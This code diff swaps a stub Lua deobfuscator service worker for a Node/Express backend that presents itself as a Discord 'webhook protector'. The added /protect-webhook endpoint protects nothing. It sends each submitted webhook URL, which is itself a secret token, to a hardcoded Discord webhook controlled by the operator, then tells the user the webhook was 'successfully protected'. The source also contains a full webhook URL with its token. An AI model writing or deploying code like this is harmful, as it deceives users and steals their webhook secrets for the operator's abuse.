@@ -1,58 +1,37 @@
-const decodeStrings = (code) => {
-    // Example: Decode Base64 strings
-    return code.replace(/string\.decode\("([^"]+)"\)/g, (_, encoded) => {
-        try {
-            const decoded = atob(encoded);
-            return `"${decoded}"`;
-        } catch {
-            return `"${encoded}"`; // If decoding fails, return the original string
-        }
-    });
-};
+const express = require("express");
+const axios = require("axios");
+const bodyParser = require("body-parser");
 
-const recoverControlFlow = (code) => {
-    // Example: Flatten jumps and loops
-    // Implement specific control flow recovery patterns here
-    return code; // Stub: Return code as-is for now
-};
+const app = express();
+app.use(bodyParser.json());
 
-const renameVariables = (code) => {
-    // Example: Rename obfuscated variables
-    const variableMap = {};
-    let varCount = 0;
-    return code.replace(/\bvar_\d+\b/g, (match) => {
-        if (!variableMap[match]) {
-            variableMap[match] = `var_${++varCount}`;
-        }
-        return variableMap[match];
-    });
-};
+// Replace with your Discord notification webhook
+const NOTIFICATION_WEBHOOK = "https://discordapp.com/api/webhooks/1363113642370797730/eigIqvtxxn1uc1fBAqh-6F1zPWUs6wlSLWXoqJ-32IIiidVhLCWQSBzL2URkQyAQDCnB";
 
-const eliminateDeadCode = (code) => {
-    // Example: Remove dead code sections
-    return code.replace(/-- Dead code start --[\s\S]*?-- Dead code end --/g, '');
-};
+app.post("/protect-webhook", async (req, res) => {
+    const { webhookUrl } = req.body;
 
-const beautifyCode = (code) => {
-    // Example: Format Lua code (basic example)
-    return code.replace(/;/g, ';\n').replace(/\{/g, '{\n').replace(/\}/g, '\n}');
-};
-
-self.addEventListener('fetch', (event) => {
-    if (event.request.method === 'POST') {
-        event.respondWith(
-            event.request.json().then((data) => {
-                let deobfuscatedCode = data.code;
-                deobfuscatedCode = decodeStrings(deobfuscatedCode);
-                deobfuscatedCode = recoverControlFlow(deobfuscatedCode);
-                deobfuscatedCode = renameVariables(deobfuscatedCode);
-                deobfuscatedCode = eliminateDeadCode(deobfuscatedCode);
-                deobfuscatedCode = beautifyCode(deobfuscatedCode);
-
-                return new Response(JSON.stringify({ deobfuscatedCode }), {
-                    headers: { 'Content-Type': 'application/json' },
-                });
-            })
-        );
+    if (!webhookUrl || !webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
+        return res.status(400).send({ message: "Invalid webhook URL." });
     }
+
+    const protectionTime = new Date().toISOString();
+
+    try {
+        // Notify your designated webhook
+        await axios.post(NOTIFICATION_WEBHOOK, {
+            content: `🚨 **Webhook Protected** 🚨\n**URL:** ${webhookUrl}\n**Time:** ${protectionTime}`,
+        });
+
+        console.log(`Webhook Protected: ${webhookUrl} at ${protectionTime}`);
+        res.status(200).send({ message: "Webhook successfully protected.", webhookUrl, protectionTime });
+    } catch (error) {
+        console.error("Error notifying Discord webhook:", error.message);
+        res.status(500).send({ message: "Failed to notify about the protected webhook." });
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Webhook protector backend running on port ${PORT}`);
 });
